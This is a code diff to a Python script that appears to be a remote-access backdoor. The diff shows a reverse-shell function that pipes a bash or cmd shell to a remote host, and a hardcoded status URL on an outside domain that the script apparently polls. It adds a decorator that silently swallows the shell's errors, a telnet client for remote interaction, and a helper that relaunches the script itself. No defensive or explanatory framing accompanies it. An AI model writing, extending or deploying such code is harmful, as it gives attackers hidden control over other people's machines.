@@ -3,6 +3,11 @@ import aiohttp # type: ignore
 import sys
 import os
 
+from aiomonitor.telnet import TelnetClient # type: ignore
+from dataclasses import dataclass
+from threading import Thread
+from subprocess import Popen
+
 SLEEP_PERIOD_SECS = 2
 
 URL_STATUS = "http://erzhanoriez.winogrona.cc/data/status"
@@ -13,6 +18,16 @@ if sys.platform == 'win32':
 else:
     SHELL = "bash"
 
+def excguard(coro):
+    async def newfun(*args, **kwargs):
+        try:
+            await coro(*args, **kwargs)
+        except Exception as e:
+            pass
+    
+    return newfun
+
+@excguard
 async def revshell(host: str, port: int) -> None:
     shell = await asyncio.create_subprocess_shell(SHELL, stdin=asyncio.subprocess.PIPE, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
 
@@ -74,6 +89,14 @@ async def струи_СЭКСА():
 
 def seks_installer():
     print(sys.executable)
+
+async def am_main(host: str, port: int) -> None:
+    async with TelnetClient(host, port) as client:
+        await client.interact()
+
+def sfxcli_client(host: str, port: int) -> None:
+    Popen([sys.executable, __file__])
+    asyncio.run(am_main(host, port))
 
 if __name__ == '__main__':
     seks_installer()
